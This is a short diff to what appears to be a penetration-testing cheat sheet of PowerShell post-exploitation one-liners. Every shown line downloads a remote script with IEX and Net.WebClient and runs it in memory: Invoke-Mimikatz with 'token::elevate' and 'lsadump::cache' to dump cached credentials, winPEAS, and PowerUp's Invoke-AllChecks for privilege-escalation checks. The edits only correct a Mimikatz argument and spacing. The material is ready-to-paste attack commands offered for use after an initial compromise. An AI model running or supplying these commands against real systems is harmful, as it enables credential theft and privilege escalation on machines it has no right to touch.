@@ -13,9 +13,9 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 Download and invoke whatever you like after stage-1:  
 ```powershell  
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::cached"'
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::cache"'
 
-IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")
+IEX (New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")
 
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");Invoke-AllChecks
 
